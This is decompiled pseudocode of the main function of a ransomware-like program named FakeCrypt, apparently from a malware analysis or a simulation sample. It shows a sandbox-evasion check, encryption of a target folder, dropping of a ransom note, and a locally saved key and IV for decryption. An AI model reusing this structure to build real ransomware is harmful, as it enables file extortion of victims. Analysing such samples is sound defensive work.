fn FakeCrypt::main() -> void {
    let v0: u64;  // [bp-0x168]
    let v1: u64;  // [bp-0x160]
    let v2: core::fmt::rt::Argument;  // [bp-0x158], Other Possible Types: struct32, u32
    let v3: u128;  // [bp-0x158]
    let v4: void*;  // [bp-0x130], Other Possible Types: u64
    let v5: u64;  // [bp-0x128]
    let v6: void*;  // [bp-0x120]
    let v7: core::result::Result<std::fs::File, std::io::error::Error>;  // [bp-0x118], Other Possible Types: std::env::Args, core::fmt::Arguments, u8
    let v8: Result<struct4, struct8>;  // [bp-0x118]
    let v9: core::result::Result<std::fs::Metadata, std::io::error::Error>;  // [bp-0x118]
    let v10: u128;  // [bp-0x117]
    let v11: u128;  // [bp-0x107]
    let v12: u128;  // [bp-0x68]
    let v13: struct16;  // [bp-0x50], Other Possible Types: u64
    let v14: u8;  // [bp-0x40]
    let v15: i64;  // [bp-0x38], Other Possible Types: core::fmt::rt::Argument
    let v16: u64;  // [bp-0x30]
    let v17: u64;  // [bp-0x28]
    let v19: i64;  // r12
    let v20: u64;  // r14
    let v21: u64;  // rbx
    let v25: u64;  // rdx
    let v26: i64;  // rax
    let v27: u128;  // xmm0
    let v28: i64;  // rax
    let v29: core::result::Result<usize, std::io::error::Error>;  // rax:rdx

    if FakeCrypt::stealth::is_sandbox() {
        println!("Unsafe Env");
        std::process::exit(1); /* do not return */
    }
    v7 = std::env::args();
    core::iter::traits::iterator::Iterator::collect(&v14, &v7);
    if v16 == 3 {
        v19 = v15;
        v17 = v19 + 48;
        v20 = *((v19 + 56) as &i64);
        v21 = *((v19 + 64) as &i64);
        v9 = std::fs::metadata(v20, v21);
        if !(v9 as i64 != 2 && std::path::Path::is_dir(v20, v21)) {
            eprintln!("[!] Invalid folder path: {}", &v17);
        } else if <[A] as core::slice::cmp::SlicePartialEq<B>>::equal(*((v19 + 32) as &i64), *((v19 + 40) as &i64), "encrypt") {
            v13 = rand::rngs::thread::thread_rng();
            v2 = struct32 {
                field_0: 0
                field_16: 0
            };
            v12 = 0;
            rand::rng::Rng::fill(&v13, &v2);
            rand::rng::Rng::fill(&v13, &v12);
            v4 = v20;
            v5 = v21;
            println!("[+] Encrypting files in: {}", &v4);
            FakeCrypt::fileops::encrypt_directory(v20, v21, &v2, &v12);
            println!("[+] Dropping ransom note...");
            FakeCrypt::fileops::drop_ransom_note();
            v7 = std::fs::File::create("keyinfo.bin");
            v0 = core::result::Result<T,E>::expect(&v7, "Failed to create key file", "src/main.rs");
            core::result::Result<T,E>::expect(std::io::Write::write_all(&v0, &v2, 32), "Failed to write key", "src/main.rs");
            core::result::Result<T,E>::expect(std::io::Write::write_all(&v0, &v12, 16), "Failed to write IV", "src/main.rs");
            println!("[✓] Done. Key saved to '{}'", "keyinfo.bin");
            goto LABEL_453f9d;
        } else if <[A] as core::slice::cmp::SlicePartialEq<B>>::equal(*((v19 + 32) as &i64), *((v19 + 40) as &i64), "decrypt") {
            println!("[+] Reading key from '{}'", "keyinfo.bin");
            v4 = 0;
            v5 = 1;
            v6 = 0;
            v8 = std::fs::File::open("keyinfo.bin");
            v2 = core::result::Result<T,E>::expect(&v8, "Could not open key file", "src/main.rs");
            v29 = <std::fs::File as std::io::Read>::read_to_end(&v2, &v4);
            core::result::Result<T,E>::expect(v29 as i8, *((&v29 as &char + 8) as &i64));
            if v6 != 48 {
                v0 = v6;
                eprintln!("[!] Key file malformed. Expected 48 bytes, got {}", &v0);
                std::process::exit(1); /* do not return */
            }
            v26 = <core::ops::range::Range<usize> as core::slice::index::SliceIndex<[T]>>::index(0, 32, v5, 48, "src/main.rs");
            if v25 == 32 {
                v27 = *(v26 as &i128);
                v11 = *((v26 + 16) as &i128);
                v10 = v27;
            }
            v7 = 1;
            v2 = core::result::Result<T,E>::unwrap(&v7);
            v28 = <core::ops::range::Range<usize> as core::slice::index::SliceIndex<[T]>>::index(32, 48, v5, v6, "src/main.rs");
            if v25 == 16 {
                v10 = *(v28 as &i128);
            }
            v7 = 1;
            v13 = core::result::Result<T,E>::unwrap(&v7);
            v0 = v20;
            v1 = v21;
            println!("[+] Decrypting files in: {}", &v0);
            FakeCrypt::fileops::decrypt_directory(v20, v21, &v2, &v13);
            println!("[✓] Decryption complete.");
LABEL_453f9d:
            return;
        } else {
            v2 = v15;
            v7 = core::fmt::Arguments {
                pieces: ["Usage: ", " <encrypt|decrypt> <folder_path>\n"]
                args: [v3]
                fmt: 0
            };
            std::io::stdio::_eprint(&v7);
        }
    } else {
        v2 = v15;
        v7 = core::fmt::Arguments {
            pieces: ["Usage: ", " <encrypt|decrypt> <folder_path>\n"]
            args: [v3]
            fmt: 0
        };
        std::io::stdio::_eprint(&v7);
    }
    std::process::exit(1); /* do not return */
}
